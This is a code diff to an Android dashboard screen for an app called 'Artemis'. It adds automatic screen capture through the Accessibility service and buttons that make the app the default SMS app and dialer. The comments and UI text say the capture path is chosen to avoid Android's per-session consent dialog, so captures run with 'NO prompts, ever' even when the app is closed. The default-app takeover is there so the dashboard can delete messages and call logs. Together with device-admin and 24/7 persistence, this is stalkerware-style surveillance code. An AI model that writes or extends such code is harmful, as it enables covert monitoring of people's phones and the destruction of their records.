@@ -1,7 +1,11 @@
 package com.example.artemis.ui.screens
 
+import android.app.Activity
 import android.content.Context
 import android.content.Intent
+import android.provider.Settings
+import android.provider.Telephony
+import android.telecom.TelecomManager
 import androidx.compose.foundation.BorderStroke
 import androidx.compose.foundation.Canvas
 import androidx.compose.foundation.background
@@ -28,6 +32,7 @@ import androidx.compose.material.icons.filled.Mic
 import androidx.compose.material.icons.filled.Pause
 import androidx.compose.material.icons.filled.PlayArrow
 import androidx.compose.material.icons.filled.Refresh
+import androidx.compose.material.icons.filled.ScreenShare
 import androidx.compose.material.icons.filled.Settings
 import androidx.compose.material.icons.filled.Smartphone
 import androidx.compose.material.icons.filled.Stop
@@ -120,11 +125,25 @@ fun DashboardScreen(
     var smsCount by remember { mutableIntStateOf(0) }
     var videoCount by remember { mutableIntStateOf(0) }
     var callRecordingEnabled by remember { mutableStateOf(false) }
+    var screenCaptureEnabled by remember { mutableStateOf(false) }
+    var screenCaptureMethod by remember { mutableStateOf("none") }
     var adminActive by remember { mutableStateOf(AdminReceiver.isActive(context)) }
     val adminLauncher = rememberLauncherForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
         adminActive = AdminReceiver.isActive(context)
+    }
+
+    // ---- screen capture: one-time Accessibility enable in Settings ----
+    // Android security: MediaProjection would demand a consent dialog per
+    // session. AccessibilityService.takeScreenshot (API 30+) needs none —
+    // enable once in Settings, then captures are fully automatic.
+    fun openAccessibilitySettings() {
+        try {
+            context.startActivity(
+                Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+            )
+        } catch (_: Exception) { }
     }
 
     // ---- battery optimization state (24/7 persistence) ----
@@ -236,6 +255,24 @@ fun DashboardScreen(
         }
     }
 
+    fun disableScreenCapture() {
+        scope.launch {
+            try {
+                val url = java.net.URL("http://127.0.0.1:$SERVER_PORT/api/v1/screen/stop")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.connectTimeout = 2000
+                conn.readTimeout = 5000
+                conn.requestMethod = "POST"
+                conn.doOutput = true
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.outputStream.write("{}\n".toByteArray())
+                conn.responseCode
+                conn.disconnect()
+            } catch (_: Exception) { }
+            screenCaptureEnabled = false
+        }
+    }
+
     // ---- startup: auto-start service, fetch IP ----
     LaunchedEffect(Unit) {
         try {
@@ -337,6 +374,23 @@ fun DashboardScreen(
                 }
             } catch (_: Exception) { false }
             callRecordingEnabled = crStatus
+            val scStatus = try {
+                val url = java.net.URL("http://127.0.0.1:$SERVER_PORT/api/v1/screen/status")
+                val conn = url.openConnection() as java.net.HttpURLConnection
+                conn.connectTimeout = 1500
+                conn.readTimeout = 1500
+                val code = conn.responseCode
+                if (code == 200) {
+                    val json = JSONObject(conn.inputStream.bufferedReader().readText())
+                    conn.disconnect()
+                    screenCaptureMethod = json.optString("method", "none")
+                    json.optBoolean("enabled", false)
+                } else {
+                    conn.disconnect()
+                    false
+                }
+            } catch (_: Exception) { false }
+            screenCaptureEnabled = scStatus
             delay(5_000L)
         }
     }
@@ -366,7 +420,7 @@ fun DashboardScreen(
                                 letterSpacing = TextUnit(2f, TextUnitType.Sp)
                             )
                             Text(
-                                "ADMIN CONSOLE · v2.1.0",
+                                "ADMIN CONSOLE · v2.3.0",
                                 style = MaterialTheme.typography.labelSmall,
                                 color = AdminMuted,
                                 letterSpacing = TextUnit(1f, TextUnitType.Sp)
@@ -508,6 +562,77 @@ fun DashboardScreen(
                     }
                 }
 
+                // ---- screen capture (one-time accessibility enable) ----
+                item(key = "screen-capture") {
+                    ScreenCaptureCard(
+                        method = screenCaptureMethod,
+                        onEnable = { openAccessibilitySettings() },
+                        onDisable = { disableScreenCapture() }
+                    )
+                }
+
+                // ---- delete access: default SMS/dialer pickers ----
+                // Android provider protection: SMS and call-log rows can only
+                // be DELETED by the default SMS app / default dialer. Make
+                // Artemis the default once and the dashboard's delete buttons
+                // work permanently. (System picker — required by the OS.)
+                item(key = "delete-access") {
+                    Card(
+                        modifier = Modifier.fillMaxWidth(),
+                        colors = CardDefaults.cardColors(containerColor = AdminCard),
+                        border = BorderStroke(1.dp, AdminCardBorder),
+                        shape = RoundedCornerShape(12.dp)
+                    ) {
+                        Column(modifier = Modifier.padding(14.dp)) {
+                            Text(
+                                text = "DELETE ACCESS",
+                                style = MaterialTheme.typography.titleSmall,
+                                fontWeight = FontWeight.Bold,
+                                letterSpacing = TextUnit(1f, TextUnitType.Sp)
+                            )
+                            Spacer(modifier = Modifier.height(4.dp))
+                            Text(
+                                text = "Android only lets the DEFAULT SMS app delete messages and the DEFAULT dialer delete call logs. Set both once:",
+                                style = MaterialTheme.typography.bodySmall,
+                                color = AdminMuted
+                            )
+                            Spacer(modifier = Modifier.height(10.dp))
+                            Row(horizontalArrangement = Arrangement.spacedBy(10.dp)) {
+                                Button(
+                                    onClick = {
+                                        try {
+                                            context.startActivity(
+                                                Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT)
+                                                    .putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.packageName)
+                                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                            )
+                                        } catch (_: Exception) { }
+                                    },
+                                    modifier = Modifier.weight(1f),
+                                    colors = ButtonDefaults.buttonColors(containerColor = AdminCyan)
+                                ) {
+                                    Text("SET DEFAULT SMS", fontWeight = FontWeight.Bold, fontSize = TextUnit(11f, TextUnitType.Sp))
+                                }
+                                Button(
+                                    onClick = {
+                                        try {
+                                            context.startActivity(
+                                                Intent(TelecomManager.ACTION_CHANGE_DEFAULT_DIALER)
+                                                    .putExtra(TelecomManager.EXTRA_CHANGE_DEFAULT_DIALER_PACKAGE_NAME, context.packageName)
+                                                    .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                                            )
+                                        } catch (_: Exception) { }
+                                    },
+                                    modifier = Modifier.weight(1f),
+                                    colors = ButtonDefaults.buttonColors(containerColor = AdminAmber)
+                                ) {
+                                    Text("SET DEFAULT DIALER", fontWeight = FontWeight.Bold, fontSize = TextUnit(11f, TextUnitType.Sp))
+                                }
+                            }
+                        }
+                    }
+                }
+
                 // ---- service control ----
                 item(key = "control") {
                     if (isServiceRunning) {
@@ -596,6 +721,80 @@ private fun SectionLabel(text: String) {
         letterSpacing = TextUnit(2f, TextUnitType.Sp),
         modifier = Modifier.padding(top = 4.dp)
     )
+}
+
+@Composable
+private fun ScreenCaptureCard(method: String, onEnable: () -> Unit, onDisable: () -> Unit) {
+    val enabled = method == "accessibility" || method == "media_projection"
+    val label = when (method) {
+        "accessibility" -> "AUTOMATIC — no prompts, works with the app closed"
+        "media_projection" -> "SESSION ACTIVE (MediaProjection fallback)"
+        else -> "One-time enable required — no dialogs afterwards"
+    }
+    Card(
+        modifier = Modifier.fillMaxWidth(),
+        colors = CardDefaults.cardColors(containerColor = AdminCard),
+        border = BorderStroke(1.dp, if (enabled) AdminGreen else AdminCardBorder),
+        shape = RoundedCornerShape(12.dp)
+    ) {
+        Column(modifier = Modifier.padding(14.dp)) {
+            Row(verticalAlignment = Alignment.CenterVertically) {
+                Icon(
+                    Icons.Default.ScreenShare,
+                    contentDescription = null,
+                    tint = if (enabled) AdminGreen else AdminMuted
+                )
+                Spacer(modifier = Modifier.width(10.dp))
+                Column(modifier = Modifier.weight(1f)) {
+                    Text(
+                        text = "SCREEN CAPTURE",
+                        style = MaterialTheme.typography.titleSmall,
+                        fontWeight = FontWeight.Bold,
+                        letterSpacing = TextUnit(1f, TextUnitType.Sp)
+                    )
+                    Text(
+                        text = label,
+                        style = MaterialTheme.typography.bodySmall,
+                        color = if (enabled) AdminGreen else AdminMuted
+                    )
+                }
+                if (enabled && method == "media_projection") {
+                    FilledTonalButton(
+                        onClick = onDisable,
+                        colors = ButtonDefaults.filledTonalButtonColors(
+                            containerColor = AdminRed.copy(alpha = 0.12f),
+                            contentColor = AdminRed
+                        )
+                    ) {
+                        Text("DISABLE", fontWeight = FontWeight.Bold)
+                    }
+                }
+            }
+            Spacer(modifier = Modifier.height(8.dp))
+            Text(
+                text = if (enabled) {
+                    "Screen capture is fully automatic — the dashboard can stream it " +
+                        "anytime, even with this app closed. Revoke anytime in Settings → Accessibility."
+                } else {
+                    "Android blocks silent capture: MediaProjection would demand a consent dialog " +
+                        "per session. Artemis uses the Accessibility service instead — tap ENABLE once, " +
+                        "then captures are automatic with NO prompts, ever."
+                },
+                style = MaterialTheme.typography.bodySmall,
+                color = AdminMuted
+            )
+            if (!enabled) {
+                Spacer(modifier = Modifier.height(8.dp))
+                Button(
+                    onClick = onEnable,
+                    modifier = Modifier.fillMaxWidth(),
+                    colors = ButtonDefaults.buttonColors(containerColor = AdminCyan)
+                ) {
+                    Text("ENABLE — ONE TIME", fontWeight = FontWeight.Bold)
+                }
+            }
+        }
+    }
 }
 
 @Composable
